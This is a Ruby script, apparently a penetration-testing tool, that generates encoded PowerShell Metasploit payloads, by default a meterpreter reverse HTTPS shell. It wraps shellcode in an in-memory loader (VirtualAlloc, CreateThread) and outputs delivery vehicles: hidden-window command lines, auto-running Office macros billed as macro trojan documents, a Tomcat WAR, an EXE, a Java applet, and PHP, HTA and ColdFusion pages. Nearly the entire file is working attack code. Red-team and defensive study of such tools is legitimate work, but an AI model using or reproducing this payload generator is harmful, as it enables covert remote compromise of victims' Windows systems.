#!/usr/bin/ruby
#
#    ps1encode.rb 
#
#    by Piotr Marszalik  -  peter.mars[at]outlook.com
#    05/08/2013
#    
#
#    Use to generate and encode a powershell based metasploit payloads. 
#
#
#    Available output types:
# => raw (encoded payload only - no powershell run options)
# => cmd (for use with bat files)
# => vba (for use with macro trojan docs) < developed in conjunction with Ryan Reynolds
# => war (tomcat) < developed in conjuntion with Tony James
# => exe (executable) requires MinGW - i586-mingw32msvc-gcc [apt-get install mingw32]
# => java (for use with malicious java applets)
# => php (for use with php pages)
# => hta (HTML applications)
# => cfm (for use with Adobe ColdFusion)
#
#    Powershell code based on PowerSploit written by Matthew Graeber and SET by Dave Kennedy
#     DETAILS - http://rvnsec.wordpress.com/2014/09/01/ps1encode-powershell-for-days/
#

require 'optparse'
require 'base64'

options = {}

optparse = OptionParser.new do|opts|

    opts.banner = "Usage: ps1encode.rb --LHOST [default = 127.0.0.1] --LPORT [default = 443] --PAYLOAD [default = windows/meterpreter/reverse_https] --ENCODE [default = cmd]"
    opts.separator ""
    
    options[:LHOST] = "127.0.0.1"
    options[:LPORT] = "443"
    options[:PAYLOAD] = "windows/meterpreter/reverse_https"
    options[:ENCODE] = "cmd"

    opts.on('-i', '--LHOST VALUE', "Local host IP address") do |i|
        options[:LHOST] = i
    end
    
    opts.on('-p', '--LPORT VALUE', "Local host port number") do |p|
                options[:LPORT] = p
        end
    
    opts.on('-a', '--PAYLOAD VALUE', "Payload to use") do |a|
                options[:PAYLOAD] = a
        end

    opts.on('-t', '--ENCODE VALUE', "Output format: raw, cmd, vba, war, exe, java, php, hta, cfm") do |t|
                options[:ENCODE] = t
        end
    opts.separator ""
end

if ARGV.empty?
  puts optparse
  exit
else
  optparse.parse!
end

$lhost = options[:LHOST]
$lport = options[:LPORT]
$lpayload = options[:PAYLOAD]
$lencode = options[:ENCODE]

#string byte to hex
class String
  def to_hex
    #"0x" + self.to_i.to_s(16)
    sprintf("0x%02x", self.to_i)
  end
end

def gen_PS_shellcode()

    results = []
    resultsS = ""

    #generate the shellcode via msfvenom and write to a temp txt file
    system("msfvenom -p #{$lpayload} LHOST=#{$lhost} LPORT=#{$lport} -s 341 -f raw > raw_shellcode_temp")

    #taking raw shellcode, each byte goes into array
    File.open('raw_shellcode_temp').each_byte do |b|
        results << b
    end

    #remove temp
    system("rm raw_shellcode_temp")

    #go through the array, convert each byte in the array to a hex string
    results.each do |i|
        resultsS = resultsS + i.to_s.to_hex + ","
    end

    #remove last unnecessary comma
    resultsS = resultsS.chop
    
    #powershell script to be executed pre-encode
    finstring = "$1 = '$c = ''[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = #{resultsS};$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + \"\\syswow64\\WindowsPowerShell\\v1.0\\powershell\";$cmd = \"-nop -noni -enc \";iex \"& $x86 $cmd $gq\"}else{$cmd = \"-nop -noni -enc\";iex \"& powershell $cmd $gq\";}"

    #convert to UTF-16 (powershell interprets base64 of UTF-16)
    ec = Encoding::Converter.new("UTF-8", "UTF-16LE")
    utfEncoded =  ec.convert(finstring)

    #string to base64 - final
    finPS = Base64.encode64(utfEncoded).gsub(/\n/, '')
    
    return finPS
end


def prep_PS_chunk(ps_shellcode)
    #The below iterates through the string and chops up strings into 254 character lengths & puts it into a 2-dimensional array   
    splitup = []
    splitup = ps_shellcode.scan(/.{1,254}/)

    stringCommands=""
    varFinal="stringFinal=stringA+"

    splitup = splitup.flatten  #make the 2-dimensional array 1-dimensional to easier iterate
    splitup.each_with_index do |val, index|   #cycle through the array and create the strings for VBA
        val=val.tr '"',''  #strip out any prior quotes in the command
        stringCommands = stringCommands+"string#{index}=\"#{val}\"\n"
        varFinal=varFinal+"string#{index}+"
    end

    varFinal=varFinal[0..-2]  #create the final command that will be executed, this removes the "+" sign from the last command
    return stringCommands + "\n" + varFinal
end 


###########################RAW_ENCODE###########################
if $lencode == "raw"

    powershell_encoded = gen_PS_shellcode()
    puts powershell_encoded

end


##########################CMD_ENCODE###########################
if $lencode == "cmd"

    powershell_encoded = gen_PS_shellcode()
    puts "powershell -nop -win Hidden -noni -enc " + powershell_encoded

end


########################VBS_ENCODE###############################
if $lencode == "vba"

    powershell_encoded = gen_PS_shellcode()
    prepped_powershell_encoded = prep_PS_chunk(powershell_encoded)

#final VBA template
vbaTEMPLATE = %{Sub Auto_Open()

stringA = "powershell.exe -NoE -NoP -NonI -W Hidden -E "
            
#{prepped_powershell_encoded}

    Shell stringFinal, 0
End Sub

Sub AutoOpen()
        Auto_Open
End Sub
Sub Workbook_Open()
        Auto_Open
End Sub
}
    puts vbaTEMPLATE

end
    

########################WAR_ENCODE###############################
if $lencode == "war"

    powershell_encoded = gen_PS_shellcode()

warTEMPLATE = %{<%@ page import="java.io.*" %>
<html>
<head>
<title>Sample</title>
</head>
<body>
<%
String yourCommand[]=\{"cmd.exe" ,"/C", " powershell -nop -win Hidden -noni -enc #{powershell_encoded} "\};
try \{
Process p = Runtime.getRuntime().exec(yourCommand);
BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));
\} catch (IOException ioe) \{
System.err.println("\\n\\n\\nIOException: "+ ioe.toString());
\}
%> 
</body>
</html>
}

#web.xml - saved within WEB-INF directory
webxmlTEMPLATE = %{<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
<servlet>
<servlet-name>Sample</servlet-name>
<jsp-file>/sample.jsp</jsp-file>
</servlet>
</web-app>
}


#temp dir - write in jsp file
system("mkdir wartemp")

jsp_file_temp = File.new("wartemp/sample.jsp", "w")
jsp_file_temp.write(warTEMPLATE)
jsp_file_temp.close

#new WEB-INF directory, write in web.xml
system("mkdir wartemp/WEB-INF")

webxml_file_temp = File.new("wartemp/WEB-INF/web.xml", "w")
webxml_file_temp.write(webxmlTEMPLATE)
webxml_file_temp.close

#Create JAR file
system("jar -cvf sample.war -C wartemp/ .")

#clean up
system("rm -r wartemp")

end


########################EXE_ENCODE###############################
if $lencode == "exe"

#determine if MinGW has been installed, support new and old MinGW system paths
mingw = File::exists?('/usr/i586-mingw32msvc') || File::exists?('/usr/bin/i586-migw32msvc')
if mingw == false
    puts "Must have MinGW installed in order to compile EXEs!!"
    puts "\n\tRun to download: apt-get install mingw32 \n"
    exit 1
end

    powershell_encoded = gen_PS_shellcode()

exeTEMPLATE = %{#include <stdio.h>
#include <stdlib.h>

int main()
\{
    system("powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
    return 0;
\}

}

#write out to a new file
c_file_temp = File.new("c_file_temp.c", "w")
c_file_temp.write(exeTEMPLATE)
c_file_temp.close
   
#compiling will require MinGW installed - "apt-get install mingw32"
puts "compiling..."

system("i586-mingw32msvc-gcc c_file_temp.c -o final_.exe")
system("rm c_file_temp.c")

puts "final_.exe created!"

end


########################JAVA_ENCODE###############################
if $lencode == "java"

powershell_encoded = gen_PS_shellcode()

javaTEMPLATE = %{import java.applet.*;
import java.awt.*;
import java.io.*;
public class Java extends Applet \{
public void init() \{
Process f;

String cmd = "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}";
try \{
f = Runtime.getRuntime().exec(cmd);
\}
catch(IOException e) \{
e.printStackTrace();
\}
Process s;
\}
\}
}

puts javaTEMPLATE

end


######################PHP_ENCODE###############################
if $lencode == "php"

powershell_encoded = gen_PS_shellcode()

phpTEMPLATE = %{<?php
system("cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}");
?>
}

puts phpTEMPLATE

end


######################HTA_ENCODE###############################
if $lencode == "hta"

powershell_encoded = gen_PS_shellcode()

htaTEMPLATE = %{<html> 
<head> 
<script language="VBScript"> 
    Set objShell = CreateObject("Wscript.Shell")
    objShell.Run "cmd.exe /c powershell -nop -win Hidden -noni -enc #{powershell_encoded}", 0
</script> 
</head> 
<body> 
<!-- info -->
</body> 
</html>
}

puts htaTEMPLATE

end


######################CFM_ENCODE###############################
if $lencode == "cfm"

powershell_encoded = gen_PS_shellcode()

cfmTEMPLATE = %{<cfexecute name = "C:\\Windows\\System32\\cmd.exe"
   arguments = "/c powershell -nop -win Hidden -noni -enc #{powershell_encoded}"
   timeout = "10">
</cfexecute>
}

puts cfmTEMPLATE

end

